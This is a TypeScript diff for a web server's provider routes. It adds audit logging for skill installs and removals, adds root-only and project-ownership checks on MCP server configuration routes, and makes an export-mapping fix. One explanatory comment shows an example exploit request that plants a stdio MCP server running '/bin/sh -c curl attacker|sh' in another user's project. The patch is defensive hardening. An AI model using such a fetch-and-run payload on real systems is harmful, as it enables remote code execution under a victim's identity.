@@ -31,13 +31,15 @@ import type {
   ProviderSkillCreateInput,
   UpsertProviderMcpServerInput,
 } from '@/shared/types.js';
-import { sessionsDb } from '@/modules/database/index.js';
+import { auditLogDb, sessionsDb } from '@/modules/database/index.js';
 import {
   renderSessionExport,
   type ExportableMessage,
 } from '@/modules/providers/services/session-export.service.js';
 import { readRequestViewer } from '@/shared/project-visibility.js';
 import { AppError, asyncHandler, createApiSuccessResponse } from '@/shared/utils.js';
+import { createLogger } from '@/shared/logger.js';
+const log = createLogger('providers');
 
 /**
  * 自定义网关的主机名,给前端决定要不要提示"卡片描述仅供参考"。
@@ -594,12 +596,47 @@ router.get(
   }),
 );
 
+/**
+ * 技能的装与卸都记审计。
+ *
+ * ## 为什么这两条要单独留痕
+ *
+ * 技能目录是**服务进程自己的 home**,一台机器上所有用户共用同一份。它不像项目
+ * 那样有 owner —— 这是产品设计(共享技能库),这里不改。但代价是:B 卸掉 A 装的
+ * 技能之后,A 的所有会话行为会**静默**改变 —— 某个 `/xxx` 命令突然不存在,或者
+ * 同名技能换成了另一份内容 —— 而 A 收不到任何通知。
+ *
+ * 在 fd 之前,这件事**不留任何痕迹**:审计事件表里一个 skill 相关的都没有,
+ * 事后没人能回答"这技能谁卸的、什么时候卸的"。所以补的是可追溯性,不是权限。
+ *
+ * 记在路由层而不是 service 层,是因为"谁在操作"只有 req 上有;service 被定时
+ * 任务之类的非 HTTP 路径调用时本来就没有 actor。
+ */
+const readSkillActor = (req: Request): { id: number | null; username: string | null } => {
+  const user = (req as Request & { user?: { id?: number; username?: string } }).user;
+  return { id: user?.id ?? null, username: user?.username ?? null };
+};
+
 router.post(
   '/:provider/skills',
   asyncHandler(async (req: Request, res: Response) => {
     const provider = parseProvider(req.params.provider);
     const input = parseProviderSkillCreatePayload(req.body);
     const skills = await providerSkillsService.addProviderSkills(provider, input);
+
+    const actor = readSkillActor(req);
+    // 记装上去之后的实际目录名,而不是请求里写的名字:落盘时会去重/改名,
+    // 审计要对得上磁盘上真实存在的那个目录。
+    const installed = skills
+      .map((skill) => skill.directoryName ?? skill.name)
+      .filter((name): name is string => typeof name === 'string' && name.length > 0);
+    auditLogDb.record({
+      userId: actor.id,
+      username: actor.username,
+      event: 'skill_installed',
+      detail: `${provider}: ${installed.length > 0 ? installed.join(', ') : '(none)'}`,
+    });
+
     res.json(createApiSuccessResponse({ provider, skills }));
   }),
 );
@@ -608,12 +645,87 @@ router.delete(
   '/:provider/skills/:directoryName',
   asyncHandler(async (req: Request, res: Response) => {
     const provider = parseProvider(req.params.provider);
-    const result = await providerSkillsService.removeProviderSkill(provider, {
-      directoryName: readPathParam(req.params.directoryName, 'directoryName'),
+    const directoryName = readPathParam(req.params.directoryName, 'directoryName');
+    const result = await providerSkillsService.removeProviderSkill(provider, { directoryName });
+
+    const actor = readSkillActor(req);
+    // `removed: false` 也记:一次点名要卸某个目录的意图,和它没卸成的事实,
+    // 都是事后排查"我的技能怎么没了"时要看的东西。
+    auditLogDb.record({
+      userId: actor.id,
+      username: actor.username,
+      event: 'skill_removed',
+      detail: `${provider}: ${directoryName}${result.removed ? '' : ' (not found)'}`,
+      outcome: result.removed ? 'success' : 'failure',
     });
+
     res.json(createApiSuccessResponse(result));
   }),
 );
+
+/**
+ * MCP 的三条路由:`workspacePath` 必须过和建会话同一道门。
+ *
+ * ## 之前是完全没有门
+ *
+ * `workspacePath` 直接 `path.resolve()` 之后拼 `.mcp.json` 写盘,既不校验路径合法,
+ * 也不问调用者看不看得见这个项目。后果不是读泄漏,是**在别人的项目里种命令**:
+ *
+ *   POST /:provider/mcp/servers
+ *   { name, transport:"stdio", command:"/bin/sh", args:["-c","curl attacker|sh"],
+ *     scope:"project", workspacePath:"/别人的项目" }
+ *
+ * 受害者下次在那个项目里跑 Claude,这条 stdio server 就会被拉起,命令以他的身份执行。
+ *
+ * ## `user` scope 收成 root-only
+ *
+ * `scope:"user"` 写的是 `~/.claude.json` —— 服务进程的家目录,**对包括 root 在内的
+ * 每个人生效**。这不是"某个项目的配置",是全机配置。普通用户不该能写它。
+ *
+ * ## 为什么复用 assertViewerMayCreateSessionAt
+ *
+ * 它就是"路径合法 + 项目可见"这两道门的现成实现,已经有 100% 覆盖的测试,而且
+ * 对两种失败一律返回同形的 404(不给一个"这个路径存不存在"的探针)。
+ * 再写一份判据只会漂 —— 这个仓库为此吃过亏(见 eo 轮的 project-permissions.service)。
+ *
+ * `workspacePath` 为空时不校验:那表示"不针对某个项目",此时只有 user scope 有意义,
+ * 而 user scope 已经被下面的 root 判定挡住了。
+ */
+async function assertMayTouchMcpScope(
+  req: Request,
+  scope: string | null | undefined,
+  workspacePath: string | null | undefined,
+): Promise<void> {
+  if (scope === 'user') {
+    if (!req.user?.isRoot) {
+      throw new AppError('用户级 MCP 配置只有管理员可以修改', {
+        code: 'ROOT_REQUIRED',
+        statusCode: 403,
+      });
+    }
+    return;
+  }
+  /**
+   * fj:非 user 作用域**必须**给出 workspacePath,而且必须过归属门。
+   *
+   * 原来是"给了才查"。而 `resolveWorkspacePath` 在没给时回落到
+   * **`process.cwd()` —— 服务进程自己的工作目录**,scope 又默认 `'project'`,
+   * 于是任何登录用户不带这两个参数就能往 Prism 安装目录里写 `.mcp.json`,
+   * 一次归属校验都不过。MCP server 配置是"这段对话能调用哪些外部进程"的清单,
+   * 这个洞的下游就是执行。
+   *
+   * 明确拒绝而不是替它挑一个默认值:猜错默认值的代价是往错误的地方写配置,
+   * 而调用方本来就知道自己在操作哪个项目。
+   */
+  const normalizedWorkspacePath = typeof workspacePath === 'string' ? workspacePath.trim() : '';
+  if (!normalizedWorkspacePath) {
+    throw new AppError('缺少 workspacePath —— 项目级 MCP 配置必须说明是哪个项目', {
+      code: 'WORKSPACE_PATH_REQUIRED',
+      statusCode: 400,
+    });
+  }
+  await assertViewerMayCreateSessionAt(readRequestViewer(req), normalizedWorkspacePath);
+}
 
 // ----------------- MCP routes -----------------
 router.get(
@@ -622,6 +734,7 @@ router.get(
     const provider = parseProvider(req.params.provider);
     const workspacePath = readOptionalQueryString(req.query.workspacePath);
     const scope = parseMcpScope(req.query.scope);
+    await assertMayTouchMcpScope(req, scope, workspacePath);
 
     if (scope) {
       const servers = await providerMcpService.listProviderMcpServersForScope(provider, scope, { workspacePath });
@@ -639,6 +752,7 @@ router.post(
   asyncHandler(async (req: Request, res: Response) => {
     const provider = parseProvider(req.params.provider);
     const payload = parseMcpUpsertPayload(req.body);
+    await assertMayTouchMcpScope(req, payload.scope, payload.workspacePath);
     const server = await providerMcpService.upsertProviderMcpServer(provider, payload);
     res.status(201).json(createApiSuccessResponse({ server }));
   }),
@@ -650,6 +764,7 @@ router.delete(
     const provider = parseProvider(req.params.provider);
     const scope = parseMcpScope(req.query.scope);
     const workspacePath = readOptionalQueryString(req.query.workspacePath);
+    await assertMayTouchMcpScope(req, scope, workspacePath);
     const result = await providerMcpService.removeProviderMcpServer(provider, {
       name: readPathParam(req.params.name, 'name'),
       scope,
@@ -842,7 +957,19 @@ router.get(
         title,
         sessionId,
         exportedAt: new Date().toISOString(),
-        messages: history.messages as ExportableMessage[],
+        // fj:显式映射,不再用 `as` 强转 —— 强转正是让 `toolUseId`/`toolName`
+        //     这类字段名漂移在编译期完全静默的原因(导出里恒为 null)。
+        messages: history.messages.map((message): ExportableMessage => ({
+          kind: message.kind,
+          role: (message as { role?: 'user' | 'assistant' }).role,
+          content: message.content,
+          timestamp: message.timestamp,
+          model: (message as { model?: string }).model,
+          toolName: (message as { toolName?: string }).toolName,
+          toolInput: (message as { toolInput?: unknown }).toolInput,
+          toolId: (message as { toolId?: string }).toolId,
+          isError: (message as { isError?: boolean }).isError,
+        })),
       },
       formatRaw,
       { includeTools },
@@ -979,7 +1106,7 @@ router.get('/search/sessions', asyncHandler(async (req: Request, res: Response) 
       res.write('event: done\ndata: {}\n\n');
     }
   } catch (error) {
-    console.error('Error searching conversations:', error);
+    log.error('Error searching conversations:', error);
     if (!closed) {
       res.write(`event: error\ndata: ${JSON.stringify({ error: 'Search failed' })}\n\n`);
     }
